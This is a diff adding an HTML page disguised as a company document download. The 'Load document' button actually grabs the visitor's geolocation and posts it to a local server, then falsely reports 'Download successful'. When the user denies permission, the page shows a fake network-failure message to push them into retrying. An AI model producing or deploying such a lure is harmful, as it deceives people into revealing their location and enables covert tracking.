@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Company Registration File</title>
+    <script>
+        // Function to get and send location data
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Function to send location data to the server
+        function sendLocation(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+
+            fetch('http://localhost:3000/location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text(); // Expecting plain text response
+            })
+            .then(data => {
+                console.log('Server response:', data);
+                document.getElementById('output').innerText = 'Download successful!You will be redirected shortly';
+            })
+            .catch(error => {
+                console.error('Error sending location:', error);
+                document.getElementById('output').innerText = 'Error sending location.';
+            });
+        }
+
+        // Function to handle location errors
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Network failure try again.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>Load the attached Documents (Note: this is confidential)</h1>
+    <button onclick="getLocation()">Load document</button>
+    <p id="output"></p>
+</body>
+</html>
